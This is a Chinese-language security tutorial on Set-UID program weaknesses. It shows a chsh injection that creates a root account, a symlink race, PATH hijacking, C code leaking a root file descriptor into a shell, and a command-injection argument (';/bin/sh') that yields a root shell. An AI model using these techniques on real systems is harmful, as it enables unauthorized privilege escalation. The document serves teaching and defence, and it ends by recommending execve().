#
#### 用户输入
如果程序没有很好的检查用户输入，将很容易受到攻击。  

例如：

- 输入数据复制到缓冲区，缓冲区移除导致恶意代码执行。  
- 输入数据被用作格式化字符串，进而改变程序行为。  

另一个有趣例子:  
在chsh早期版本是一个允许用户修改默认shell的Set-UID程序。默认shell信息存储在/etc/passwd中。确认用户身份后，chsh把用户提供的shell程序名称更新到/etc/passwd的末尾字段。这时用户如果输入**两行数据**。第一行数据更新用户的shell字段。第二行数据为完整的/etc/passwd行数据并且第三第四个字段都为0。这就相当于攻击创建了一个root账户。  
!!! passwd数据行  
    root:x:0:0:root:/root:/bin/bash

&emsp;
#### 系统输入
例如：  
  一个特权程序修改/etc下的xyz文件，系统根据文件名提供目标文件。看上去用户没有提供输入，但是用户可以软链接使/etc/xyz指向/etc/shadow。竞态条件攻击就是利用这种方法。

&emsp;
#### 环境变量
环境变量是被程序隐式使用的，因此程序可能在毫不知情的情况下使用了用户提供的不可信任的输入数据。

例如：  
system("ls") 函数实际是调用/bin/sh来运行。并没有提供ls的完整路径，所以会从PATH环境变量中寻找ls指令的位置。因此完全可以提供名字为ls的恶意程序。

&emsp;
#### 权限泄露
当一个进程从特权程序转变为非特权程序时，经常出现权限泄漏的错误。就是虽然进程的有效用户ID变成非特权的，但进程仍然具有特权。

例如:   
忘记关闭文件描述符,虽然通过setuid(getuid)把有效用户ID变成了和真实用户ID一样，即程序放弃了root特权，但是文件描述符仍有root权限,仍可以写入。
```
// changfile.c
# include <unistd.h>
# include <stdio.h>
# include <stdlib.h>
# include <fcntl.h>

int main(int argc, char const *argv[])
{
    int fd;
    char *v[2];

    fd = open("/home/ubuntu/test.txt", O_RDWR | O_APPEND);

    if (fd == -1) {
        printf("Cannot open /home/ubuntu/test.txt\n");
        exit(0);
    };

    printf("fd is %d\n", fd);

    setuid(getuid());
    v[0] = "/bin/sh"; v[1]=0;
    execve(v[0], v, 0);

    return 0;
}
```
```
ubuntu@VM-0-17-ubuntu:~$ touch test.txt
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 444 test.txt  #设置只读
ubuntu@VM-0-17-ubuntu:~$ echo 666 > test.txt 
-bash: test.txt: Permission denied
ubuntu@VM-0-17-ubuntu:~$ vi changfile.c 
ubuntu@VM-0-17-ubuntu:~$ gcc changfile.c -o changfile
ubuntu@VM-0-17-ubuntu:~$ sudo chown root changfile
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 4755 changfile
ubuntu@VM-0-17-ubuntu:~$ ./changfile 
fd is 3
$ cat /home/ubuntu/test.txt
$ echo shan > /home/ubuntu/test.txt
/bin/sh: 2: cannot create /home/ubuntu/test.txt: Permission denied
$ echo shan >&3
$ cat /home/ubuntu/test.txt
shan
```

!!! note
    需要使用/bin/sh维持进程，程序进程关闭后会销毁文件描述符

&emsp;
#### 调用其他不安全的程序
比如使用system(),不只是c语言，其他语言这类函数也是同样如此。  
system函数是程序中执行外部命令最简单的方式，除了调用时环境变量会造成危害外，由于system不检查输入指令的语法，会存在代码的注入攻击，黑客可以注入自己想要执行的语句，借用特权程序执行这些语句。  
```
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 222 test.txt # 创建一个不可读的文件
ubuntu@VM-0-17-ubuntu:~$ sudo chown root catall
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 4755 catall

ubuntu@VM-0-17-ubuntu:~$ ./catall "/home/ubuntu/test.txt;/bin/sh"
/bin/cat: /home/ubuntu/test.txt: Permission denied
$ id  
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
$ cat /home/ubuntu/test.txt
cat: /home/ubuntu/test.txt: Permission denied
```
显示Permission denied，euid也没有变为0。这是因为Ubuntu 16.04以上版本，/bin/sh实际上是一个指向/bin/dash的链接文件，dash实现了 一个保护机制，当它发现自己在一个Set-UID的进程中运行时，会立刻把有效用户id变成实际 用户id，主动放弃特权。故利用/bin/sh发起的攻击不会成功。  
下面安装一个zsh的shell程序来做这个实验,实验结束记得改回来。  

```
ubuntu@VM-0-17-ubuntu:~$ sudo apt install zsh
ubuntu@VM-0-17-ubuntu:~$ sudo ln -sf /bin/zsh /bin/sh


ubuntu@VM-0-17-ubuntu:~$ ./catall "/home/ubuntu/test.txt;/bin/sh"
shan
# id
uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
# cat /home/ubuntu/test.txt
shan
# exit

ubuntu@VM-0-17-ubuntu:~$  sudo ln -sf /bin/dash /bin/sh
```

**在c中建议使用安全的函数execve()，它会把上面`/home/ubuntu/test.txt;/bin/sh`这个参数只当作是一个参数，不会解析成一个命令。**  
**这也反映了计算机安全的一个重要原则，数据和代码应该清晰的分离开。**
